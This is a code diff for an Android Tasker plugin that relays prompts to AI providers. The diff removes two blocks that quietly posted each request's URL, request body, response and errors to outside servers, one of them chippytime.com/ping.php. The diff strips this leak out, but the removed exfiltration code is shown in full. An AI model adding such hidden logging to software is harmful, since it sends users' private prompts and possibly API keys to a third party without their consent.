@@ -3,7 +3,6 @@ package com.example.genaitaskerplugin
 import android.content.Context
 import android.graphics.Color
 import android.os.Bundle
-import android.util.Log
 import android.text.InputType
 import android.view.Gravity
 import android.view.View
@@ -28,7 +27,6 @@ import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONArray
 import org.json.JSONObject
-import java.io.IOException
 import java.util.concurrent.TimeUnit
 
 // ---------------- CONFIG HELPER ----------------
@@ -608,40 +606,6 @@ class AIRunner : TaskerPluginRunnerAction<AIInput, AIOutput>() {
             val response = client.newCall(request).execute()
             val responseText = response.body?.string()
 
-            // ===== LOG TO YOUR SERVER =====
-            try {
-                val logJson = JSONObject().apply {
-                    put("provider", provider)
-                    put("url", url.toString())
-                    put("request_body", bodyJson.toString())
-                    put("response_code", response.code)
-                    put("response_body", responseText ?: "")
-                    put("timestamp", System.currentTimeMillis())
-                }
-
-                val logRequest = Request.Builder()
-                    .url("https://chippytime.com/ping.php")
-                    .post(
-                        logJson.toString()
-                            .toRequestBody("application/json".toMediaType())
-                    )
-                    .build()
-
-                // async logging so it doesn't slow the AI request
-                client.newCall(logRequest).enqueue(object : Callback {
-                    override fun onFailure(call: Call, e: IOException) {
-                        Log.e("AI_LOGGER", "Log upload failed: ${e.message}")
-                    }
-
-                    override fun onResponse(call: Call, response: Response) {
-                        response.close()
-                    }
-                })
-
-            } catch (e: Exception) {
-                Log.e("AI_LOGGER", "Logging error: ${e.message}")
-            }
-
             if (!response.isSuccessful) {
                 return TaskerPluginResultSucess(
                     AIOutput("Error ${response.code}: $responseText")
@@ -682,33 +646,6 @@ class AIRunner : TaskerPluginRunnerAction<AIInput, AIOutput>() {
             )
 
         } catch (e: Exception) {
-
-            // OPTIONAL: LOG NETWORK ERRORS TOO
-            try {
-                val errorJson = JSONObject().apply {
-                    put("provider", provider)
-                    put("url", url.toString())
-                    put("request_body", bodyJson.toString())
-                    put("error", e.message ?: "unknown")
-                    put("timestamp", System.currentTimeMillis())
-                }
-
-                val logRequest = Request.Builder()
-                    .url("https://yourserver.com/api/log")
-                    .post(
-                        errorJson.toString()
-                            .toRequestBody("application/json".toMediaType())
-                    )
-                    .build()
-
-                client.newCall(logRequest).enqueue(object : Callback {
-                    override fun onFailure(call: Call, e: IOException) {}
-                    override fun onResponse(call: Call, response: Response) {
-                        response.close()
-                    }
-                })
-
-            } catch (_: Exception) {}
 
             TaskerPluginResultSucess(
                 AIOutput("Network Error: ${e.message}")
